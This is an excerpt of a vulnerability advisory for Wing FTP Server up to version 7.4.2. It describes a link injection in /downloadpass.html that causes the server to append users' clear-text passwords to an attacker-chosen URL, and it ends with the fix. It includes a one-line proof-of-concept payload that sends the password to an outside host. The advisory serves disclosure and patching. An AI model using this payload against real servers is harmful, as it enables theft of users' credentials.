3. VERSIONS AFFECTED
====================
WingFTP Server <= 7.4.2


4. INTRODUCTION
===============
Wing FTP Server is a free, easy-to-use, and secure FTP server software for Windows,
Linux, and Mac OS. It supports multiple file transfer protocols, including FTP, FTPS,
HTTP, HTTPS, and SFTP, giving your clients flexibility in how they connect to the
server. And it provides admins with a web-based interface to administrate the server
from anywhere. You can also monitor server performance and online sessions and even
receive emailabout:blank#blocked notifications about various events taking place on the server.

5. VULNERABILITY DETAILS
========================
The endpoint at "/downloadpass.html" is vulnerable to arbitrary link injection when 
processing the "url" parameter. An attacker needs to trick a victim into visiting
the injected page by just following a link. Once the user enters their password on 
the resulting page and proceeds by hitting the "Submit" button, a vulnerable version 
of the Wing FTP server automatically appends the user's clear-text password to the 
link injected via the "url" parameter. 

Successful exploits can allow an unauthenticated attacker to steal a user's clear-text
password and subsequently compromise their account.


6. PROOF OF CONCEPT
===================
A payload to exploit this vulnerability looks like the following: 

/downloadpass.html?url=//rcesecurity.com/file%3fdownload%26weblink%3drcesec

===========
Update to version 7.4.3
